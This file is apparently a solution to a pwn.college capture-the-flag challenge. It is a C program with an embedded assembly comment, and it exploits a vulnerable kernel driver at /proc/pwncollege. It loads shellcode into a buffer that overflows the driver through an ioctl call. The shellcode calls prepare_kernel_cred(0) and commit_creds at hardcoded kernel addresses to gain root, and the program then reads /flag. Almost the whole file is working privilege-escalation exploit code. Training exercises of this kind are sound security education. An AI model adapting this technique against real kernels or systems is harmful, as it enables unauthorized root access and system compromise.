/*

section .text
global _start
_start:
    ; Save preserved registers (ABI requirement)
    push rbx
    push rbp
    push r12
    push r13
    push r14
    push r15

    ; prepare_kernel_cred(0)
    xor rdi, rdi                ; arg0 = NULL (0)
    mov rax, 0xffffffff81089660 ; prepare_kernel_cred address
    call rax

    ; commit_creds(result)
    mov rdi, rax                ; result from prepare_kernel_cred
    mov rax, 0xffffffff81089310 ; commit_creds address
    call rax

    ; Restore registers
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbp
    pop rbx

    ; Clean return
    xor rax, rax        ; return 0
    ret

*/

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>

#define DEVICE_PATH "/proc/pwncollege"
#define IOCTL_CMD 1337
#define SHELLCODE_FILE "shellcode.bin"

int main() {
    int fd, sc_fd;
    char *buffer;
    size_t buffer_size = 4112;
    ssize_t sc_size;

    buffer = (char *)malloc(buffer_size);
    if (!buffer) {
        perror("malloc failed");
        return -1;
    }

    memset(buffer, 'A', buffer_size);
    *(uint64_t *)buffer = 0x1000;

    sc_fd = open(SHELLCODE_FILE, O_RDONLY);
    if (sc_fd < 0) {
        perror("open shellcode failed");
        free(buffer);
        return -1;
    }

    sc_size = read(sc_fd, buffer + 8, buffer_size - 16);
    if (sc_size < 0) {
        perror("read shellcode failed");
        close(sc_fd);
        free(buffer);
        return -1;
    }
    close(sc_fd);

    uint64_t target_address = 0xffffc90000085000;
    memcpy(buffer + buffer_size - 8, &target_address, 8);
    printf("[+] Read Shellcode\n");
    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0) {
        perror("open device failed");
        free(buffer);
        return -1;
    }

    if (ioctl(fd, IOCTL_CMD, buffer) < 0) {
        perror("ioctl failed");
    }
    printf("[+] Trigger Shellcode\n");
    printf("[+] Elevate Process\n");

    close(fd);
    free(buffer);
    system("id;cat /flag");
    return 0;
}
